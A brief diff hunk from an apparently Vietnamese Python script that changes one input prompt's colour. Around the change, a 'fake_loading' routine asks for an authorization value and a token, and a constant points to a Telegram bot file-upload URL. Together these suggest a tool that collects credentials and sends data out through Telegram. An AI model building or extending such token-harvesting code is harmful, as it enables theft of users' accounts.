@@ -22,7 +22,7 @@ TELEGRAM_URL = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
 def fake_loading():
     animations = ["|", "/", "-", "\\"]
     print(banner)
-    autho = input(f'Nhập Authorizon : ')
+    autho = input(f'{trang}Nhập Authorizon : ')
     token = input(f'Nhập T : ')
     
 
